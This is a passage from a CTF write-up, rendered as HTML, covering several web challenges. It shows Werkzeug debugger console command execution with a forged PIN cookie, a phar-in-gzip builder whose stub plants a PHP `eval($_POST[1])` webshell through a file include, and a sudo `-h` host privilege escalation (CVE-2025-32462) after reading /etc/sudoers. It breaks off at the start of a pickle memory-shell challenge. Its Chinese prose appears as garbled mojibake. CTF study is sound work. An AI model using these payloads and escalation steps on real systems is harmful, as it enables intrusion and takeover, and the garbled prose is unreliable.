</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å®Œæ•´Cookie (å¯ç›´æ¥ç”¨äºè¯·æ±‚): </span><span class="si">{</span><span class="n">cookie_name</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">cookie_value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># å…¼å®¹åŸè„šæœ¬çš„è¾“å‡ºæ ¼å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">å…¼å®¹è¾“å‡ºæ ¼å¼:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">pin</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">cookie_name</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">cookie_value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰è¿™ä¸ªcookieæˆ‘ä»¬è¿˜éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œfrmå’Œsï¼Œè¿™é‡Œfrmç›´æ¥ç½®ä¸º0ï¼Œsçš„è¯éœ€è¦è·å–ä¸€ä¸‹</p>
<p><img src="/p/qctf2025/image-20251120094742346.png"
	width="926"
	height="664"
	srcset="/p/qctf2025/image-20251120094742346_hu12010455071436739715.png 480w, /p/qctf2025/image-20251120094742346_hu2155258765553783292.png 1024w"
	loading="lazy"
	
		alt="image-20251120094742346"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<p>è·å–sé€šè¿‡è®¿é—®/consoleï¼Œè¿™é‡Œéœ€è¦ç”¨å›ç¯åœ°å€</p>
<p>yakitè¿™ä¹ˆå‘å°±å‘ä¸åˆ°ï¼Œè¿˜æ˜¯bpå‰å®³</p>
<p><img src="/p/qctf2025/image-20251120100537953.png"
	width="1386"
	height="832"
	srcset="/p/qctf2025/image-20251120100537953_hu14089883752700674527.png 480w, /p/qctf2025/image-20251120100537953_hu4492745090410074285.png 1024w"
	loading="lazy"
	
		alt="image-20251120100537953"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="399px"
	
></p>
<p>æœ€åå¸¦ä¸Šcookieæ‰§è¡Œå‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console?__debugger__=yes&amp;cmd=__import__(%27os%27).popen(%27cat%20/fl*%27).read()&amp;frm=0&amp;s=Ng7zE4Qz3L7sumwL9Ius
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cookie: __wzdc0d0bff00be4f53effea=1763605329|787cd4fb4238
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251120102427875.png"
	width="1417"
	height="564"
	srcset="/p/qctf2025/image-20251120102427875_hu933096339337565951.png 480w, /p/qctf2025/image-20251120102427875_hu12091470111956141339.png 1024w"
	loading="lazy"
	
		alt="image-20251120102427875"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="602px"
	
></p>
<h3 id="æ¥getshell-é€Ÿåº¦">æ¥getshell é€Ÿåº¦ï¼
</h3><h4 id="çŸ¥è¯†ç‚¹includeè§£ææ¶æ„pharsudoææƒæ±‡æ€»">çŸ¥è¯†ç‚¹ï¼šincludeè§£ææ¶æ„pharï¼Œsudoææƒæ±‡æ€»
</h4><p>æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$allowed_extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;zip&#39;</span><span class="p">,</span> <span class="s1">&#39;bz2&#39;</span><span class="p">,</span> <span class="s1">&#39;gz&#39;</span><span class="p">,</span> <span class="s1">&#39;xz&#39;</span><span class="p">,</span> <span class="s1">&#39;7z&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$allowed_mime_types</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application/zip&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application/x-bzip2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application/gzip&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application/x-gzip&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application/x-xz&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;application/x-7z-compressed&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$tempfile</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tempfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s2">&#34;__HALT_COMPILER();&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s2">&#34;PK&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">        <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s2">&#34;&lt;?&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nx">stripos</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="s2">&#34;&lt;?php&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Nope :&lt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// mimetype check
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$finfo</span> <span class="o">=</span> <span class="nx">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nx">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="nv">$allowed_mime_types</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;unexpected mimetype&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// ext check
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]),</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allowed_extensions</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;unexpected extension&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="s2">&#34;/tmp/&#34;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;File upload success!Please include with &#39;url&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;fail&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>     
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nv">$include_url</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\.(zip|bz2|gz|xz|7z)/i&#34;</span><span class="p">,</span> <span class="nv">$include_url</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;unexpected extension&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;/tmp/&#39;</span> <span class="o">.</span> <span class="nv">$include_url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;form enctype=&#39;multipart/form-data&#39; method=&#39;post&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#39;file&#39; name=&#39;file&#39;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#34;submit&#34; value=&#34;upload&#34;&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/form&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>åªèƒ½ä¼ å‹ç¼©åŒ…æ–‡ä»¶ï¼Œå¾ˆè‡ªç„¶çš„å°±æƒ³åˆ°äº†pharå‹ç¼©gzç»•è¿‡ï¼Œç„¶åincludeè§£ææ—¶å†™é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;exp.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">compressFiles</span><span class="p">(</span><span class="nx">Phar</span><span class="o">::</span><span class="na">GZ</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>   <span class="c1">//é©¬å†™åœ¨stubé‡Œé¢
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$stub</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">STUB</span><span class="s">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s">$filename=&#34;/var/www/html/2.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s">$content=&#34;&lt;?php eval(\$_POST[1]);?&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s">file_put_contents($filename, $content);
</span></span></span><span class="line"><span class="cl"><span class="s">__HALT_COMPILER();
</span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">gzopen</span><span class="p">(</span><span class="s2">&#34;exp.phar.gz&#34;</span><span class="p">,</span> <span class="s1">&#39;w9&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;exp.phar&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">gzclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=exp.phar.gz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ç”¨includeè§£æå†™é©¬
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†™é©¬æˆåŠŸ</p>
<p><img src="/p/qctf2025/image-20251120110622378.png"
	width="700"
	height="649"
	srcset="/p/qctf2025/image-20251120110622378_hu12756888173911697861.png 480w, /p/qctf2025/image-20251120110622378_hu15344956888699181773.png 1024w"
	loading="lazy"
	
		alt="image-20251120110622378"
	
	
		class="gallery-image" 
		data-flex-grow="107"
		data-flex-basis="258px"
	
></p>
<p>ä½†æ˜¯è¯»ä¸åˆ°flagï¼Œä¼°è®¡æ˜¯æƒé™é—®é¢˜ï¼Œå°è¯•sudoææƒ</p>
<p><a class="link" href="https://jimi-lab.github.io/2025/07/04/Linux%e6%8f%90%e6%9d%83-%e5%88%a9%e7%94%a8sudo%e6%8f%90%e6%9d%83%e8%b6%85%e7%ba%a7%e6%97%a0%e6%95%8c%e5%a4%a7%e6%b1%87%e6%80%bb/"  target="_blank" rel="noopener"
    >Linuxææƒ-åˆ©ç”¨sudoææƒè¶…çº§æ— æ•Œå¤§æ±‡æ€» - Jimi&rsquo;s blog</a></p>
<p>å…ˆçœ‹çœ‹è‡ªå·±çš„æƒé™ï¼Œå…¶å®å‰é¢ä¹Ÿæœ‰</p>
<p><img src="/p/qctf2025/image-20251120112455840.png"
	width="830"
	height="91"
	srcset="/p/qctf2025/image-20251120112455840_hu5632607642245303358.png 480w, /p/qctf2025/image-20251120112455840_hu14922852693633646520.png 1024w"
	loading="lazy"
	
		alt="image-20251120112455840"
	
	
		class="gallery-image" 
		data-flex-grow="912"
		data-flex-basis="2189px"
	
></p>
<p>éå¸¸ä½ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹sudoçš„ç‰ˆæœ¬</p>
<p><img src="/p/qctf2025/image-20251120112530036.png"
	width="592"
	height="103"
	srcset="/p/qctf2025/image-20251120112530036_hu9349613859343978470.png 480w, /p/qctf2025/image-20251120112530036_hu8330999212844062896.png 1024w"
	loading="lazy"
	
		alt="image-20251120112530036"
	
	
		class="gallery-image" 
		data-flex-grow="574"
		data-flex-basis="1379px"
	
></p>
<p>1.8.23å­˜åœ¨æ¼æ´</p>
<ol>
<li><strong>æ¼æ´åç§°</strong>ï¼šLinux sudo host æƒé™æå‡æ¼æ´</li>
<li><strong>CVE ç¼–å·</strong>ï¼š<a class="link" href="https://hilang.cloud/tag/cve-2025-32462/"  target="_blank" rel="noopener"
    >CVE-2025-32462</a></li>
<li><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šsudo ç‰ˆæœ¬ 1.9.0 &lt;= sudo &lt;= 1.9.17 æˆ– 1.8.8 &lt;= sudo &lt;= 1.8.32</li>
<li><strong>æ¼æ´åŸç†</strong>ï¼šsudo çš„ - hï¼ˆâ€“hostï¼‰é€‰é¡¹é”™è¯¯åœ°å°†è¿œç¨‹ä¸»æœºçš„æƒé™è§„åˆ™åº”ç”¨åˆ°æœ¬åœ°ç³»ç»Ÿï¼Œå¯¼è‡´æœ¬åœ°ä½æƒé™ç”¨æˆ·å¯é€šè¿‡æŒ‡å®šå…è®¸çš„è¿œç¨‹ä¸»æœºåï¼Œç»•è¿‡æœ¬åœ°æƒé™é™åˆ¶ï¼Œä»¥ root èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</li>
</ol>
<p>è¿˜éœ€è¦çŸ¥é“è¿œç¨‹ä¸»æœºæ˜¯å•¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /etc/sudoers
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251120113757794.png"
	width="608"
	height="136"
	srcset="/p/qctf2025/image-20251120113757794_hu17839938833868890773.png 480w, /p/qctf2025/image-20251120113757794_hu4135870571360239922.png 1024w"
	loading="lazy"
	
		alt="image-20251120113757794"
	
	
		class="gallery-image" 
		data-flex-grow="447"
		data-flex-basis="1072px"
	
></p>
<p>æ‰€ä»¥æˆ‘ä»¬ç”¨-hå‚æ•°æŒ‡å®šasd.asd.asdè¿œç¨‹è™šæ‹Ÿä¸»æœºæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚è¿™é‡Œè¿˜éœ€è¦ä¿è¯<code>www-data   asd.asd.asd = NOPASSWD:ALL</code></p>
<p>æœ€å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -h asd.asd.asd cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251120114050709.png"
	width="649"
	height="51"
	srcset="/p/qctf2025/image-20251120114050709_hu16300189114741938756.png 480w, /p/qctf2025/image-20251120114050709_hu7128083512767820065.png 1024w"
	loading="lazy"
	
		alt="image-20251120114050709"
	
	
		class="gallery-image" 
		data-flex-grow="1272"
		data-flex-basis="3054px"
	
></p>
<h3 id="è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°">è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°
</h3><h4 id="çŸ¥è¯†ç‚¹pickleå†…å­˜é©¬">çŸ¥è¯†ç‚¹ï¼špickleå†…å­˜é©¬
</h4><p>/srcè·å–æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PICKLE_BLACKLIST</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;os&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;x80&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;before&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;after&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/src&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
